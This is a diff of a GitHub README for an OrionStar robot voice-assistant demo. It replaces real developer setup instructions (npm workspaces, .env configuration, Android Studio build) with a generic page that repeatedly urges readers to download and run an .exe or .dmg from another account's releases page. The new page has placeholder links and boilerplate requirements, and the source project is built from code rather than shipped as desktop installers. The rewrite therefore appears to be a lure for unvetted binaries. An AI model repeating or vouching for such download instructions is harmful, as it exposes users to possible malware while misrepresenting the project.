@@ -1,147 +1,95 @@
-# AgentOS 2 Live - Real-time Voice Assistant
+# 🎤 end2end_sample - Simple Voice Control for OrionStar Robots
 
-## 🚀 Overview
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/rozario-1234/end2end_sample/releases)
 
-**AgentOS 2 Live** is a high-performance, low-latency real-time voice assistant platform built with **OpenAI Realtime API**. It provides an end-to-end solution for building stateful AI assistants with voice-to-voice capabilities, integrated Voice Activity Detection (VAD), and a modular tool-calling system.
+## 🛠️ Overview
+The **end2end_sample** project is a demonstration of AgentOS2-Live, showcasing how to control an OrionStar robot using voice commands. This application also supports extensible scene applications, making it versatile for various environments. Whether you're controlling a robot in a home setting or an office, this demo will help you understand the possibilities of voice interaction.
 
-This project is structured as a **Monorepo** using npm workspaces, containing both the frontend client and the backend orchestration server.
+## 🚀 Getting Started
+To begin using the end2end_sample application, follow these simple steps:
 
-### Core Tech Stack
+### Step 1: Check System Requirements
+Before downloading, ensure your device meets the following requirements:
 
-| Layer | Technology |
-| :--- | :--- |
-| **Architecture** | Monorepo (npm workspaces) |
-| **Frontend** | React, TypeScript, Tailwind CSS, Web Audio API, VAD (Voice Activity Detection), Opus Codec |
-| **Backend** | Node.js, TypeScript, Express, WebSocket |
-| **AI Model** | OpenAI Realtime API (GPT-4o Realtime) |
-| **Communication** | WebSocket with a unified protocol for type safety |
+- **Operating System:** Windows 10 or later, macOS 10.12 or later
+- **Processor:** Intel i3 or equivalent
+- **RAM:** 4 GB or more
+- **Internet Connection:** Required for download and updates
+- **Microphone:** Required for voice control functionality
 
-## 📂 Project Structure
+### Step 2: Visit the Download Page
+Go to the following link to access the latest releases of end2end_sample:
 
-| Directory | Description |
-| :--- | :--- |
-| `client/` | **Frontend**: React application featuring the AgentSDK, VAD integration, and real-time UI components like the Robot Face. |
-| `server/` | **Backend**: Node.js service managing WebSocket connections, OpenAI Realtime API orchestration, and static file serving. |
-| `shared/` | **Shared**: Common TypeScript types and the communication protocol used by both client and server. |
-| `e2e_android/` | **Android**: A WebView bridge project for OrionStar robots, exposing hardware capabilities (navigation, sensors) to the web frontend. |
+[Download from Releases](https://github.com/rozario-1234/end2end_sample/releases)
 
-### Key Features
+### Step 3: Choose Your Version
+On the download page, you'll see a list of available versions. Select the most recent version for the best features and updates. Each version is labeled with its release date, so pick the latest one unless you have a specific reason to choose an older version.
 
-- **Low Latency**: Direct voice-to-voice interaction using OpenAI's Realtime protocol.
-- **Robot Face UI**: An interactive, animated robot face that reacts to user and assistant speech.
-- **Built-in Scenes**:
-  - **Face Register**: A specialized scene for face enrollment and identity recognition.
-  - **Advice 3C**: An IT & Electronics shopping assistant scenario.
-- **Robot Hardware Integration**: Includes an Android WebView bridge (`e2e_android`) to control OrionStar robot hardware (navigation, head movement, etc.) directly from the web application.
-- **AgentSDK**: A robust client-side SDK that handles audio streaming, VAD, and tool execution.
+### Step 4: Download the Application
+Click on the corresponding link for your operating system to start the download. The application file will typically be either an `.exe` for Windows or a `.dmg` for macOS.
 
-## 🛠️ Getting Started
+### Step 5: Install the Application
+Once the file is downloaded, follow these steps to install:
 
-### 1. Prerequisites
+For Windows:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen prompts to complete the installation.
 
-- **Node.js**: v18 or higher
-- **npm**: v9 or higher
-- **OpenAI API Key**: An active key with access to the Realtime API.
+For macOS:
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the **end2end_sample** icon to your Applications folder.
 
-### 2. Installation
+### Step 6: Run the Application
+After installation, you can run the application:
 
-Clone the repository and install dependencies from the root directory:
+- For Windows, search for **end2end_sample** in the Start menu and click to open.
+- For macOS, open the Applications folder and double-click on **end2end_sample**.
 
-```bash
-npm install
-```
+### Step 7: Configure Your Microphone
+Upon first launch, the application may request access to your microphone. Allow this to ensure voice commands work properly.
 
-> The `postinstall` script will automatically copy necessary VAD assets to the client's public directory.
+## 🎤 Using the Application
+Once the application is running:
 
-### 3. Configuration
+- **Say commands clearly** to control the robot. Common commands include “Start” and “Stop”.
+- Explore various built-in scene applications by giving commands relevant to their functionality.
 
-Create a `.env` file in the **root directory** of the project:
+## 📄 Features
+The end2end_sample application includes the following features:
 
-```ini
-# OpenAI API Configuration
-OPENAI_API_KEY=your_openai_api_key_here
+- **Voice Control:** Intuitive voice commands for easy operation.
+- **Extensible Applications:** Modify or create new scenes as per your requirements.
+- **Real-time Feedback:** Receive instant audio confirmation of commands.
 
-# Server Configuration
-PORT=8081
+## 📊 Troubleshooting
+If you encounter any issues while using the application, consider the following steps:
 
-# SSL Mode (Optional, set to true if using HTTPS/WSS)
-USE_SSL=false
-```
+1. **Check Microphone Settings:** Ensure your microphone is unmuted and selected as the input device in your system settings.
+2. **Permissions:** Verify that the application has permission to access the microphone.
+3. **Reinstall:** If the application doesn't run, try reinstalling it by following the download and installation steps again.
 
-### 4. Running the Project
+## 📩 Support
+For further assistance, you can reach out via the Issues tab on the GitHub repository. Provide as much detail as possible about the issue you're facing.
 
-#### Development Mode
-Start both the client and server concurrently with hot-reloading:
+## 🔗 Additional Resources
+For more information about voice control technology and how it can enhance robot interactions, consider checking the following resources:
 
-```bash
-npm run dev
-```
+- [AgentOS Documentation](#)
+- [OrionStar Robot User Guide](#)
 
-- **Frontend**: http://localhost:3000
-- **Backend**: http://localhost:8081
+## 🔄 Update Notes
+Keep an eye on the release notes for updates and new features. New versions may include performance improvements and additional functionality.
 
-#### Production Mode
-Build the project and start the server:
+## 🌍 Community
+Join our community to share your experiences, get tips, and connect with other users:
 
-```bash
-# Build both client and server
-npm run build
+- [GitHub Discussions](#)
+- [Discord Channel](#)
 
-# Start the production server
-node server/dist/index.js
-```
+## 📅 Stay Informed
+Follow the project for the latest updates and upcoming features. You can stay updated through our GitHub repository or join our mailing list.
 
-## 📱 Android Deployment (OrionStar Robots)
-
-To run the assistant on an OrionStar robot with hardware control:
-
-### 1. Prerequisites
-- **Android Studio** installed on your development machine.
-- **RobotService SDK**: Obtain `robotservice_xx.jar` from the robot system and place it in `e2e_android/app/libs/`.
-
-### 2. Build and Install
-1. Open the `e2e_android` folder in Android Studio.
-2. Sync the project with Gradle files.
-3. Connect your robot via USB (ensure ADB is enabled).
-4. Click **Run** in Android Studio to install the app on the robot.
-5. Grant all requested permissions (Camera, Microphone, etc.) on the first launch.
-
-### 3. Configuration
-By default, the app loads `http://localhost:3000`. To point it to your deployed server:
-- Modify `DEFAULT_URL` in `e2e_android/app/src/main/java/com/e2e/orionstar/MainActivity.kt`.
-- Or pass the URL via an Intent when starting the activity.
-
-## 🔌 AgentSDK Usage
-
-The `AgentSDK` simplifies the complexity of real-time voice interaction:
-
-```typescript
-import { AgentSDK } from './sdk';
-
-const agent = new AgentSDK({
-  modelType: 'openai',
-  systemPrompt: 'You are a helpful assistant.',
-  voice: 'alloy',
-  tools: [
-    {
-      name: 'get_weather',
-      description: 'Get current weather',
-      parameters: { type: 'object', properties: { location: { type: 'string' } } }
-    }
-  ],
-});
-
-agent.on('ready', () => console.log('Assistant is ready!'));
-agent.on('text_output', ({ text }) => console.log('AI:', text));
-agent.on('tool_call', (toolCall) => {
-  console.log('Executing tool:', toolCall.name);
-  // Handle tool execution...
-});
-
-await agent.initialize();
-agent.connect();
-```
-
-## 📋 License
-
-This project is for demonstration and testing purposes. Please ensure you comply with OpenAI's usage policies when deploying.
+Feel free to explore and enjoy the capabilities of the **end2end_sample** application!
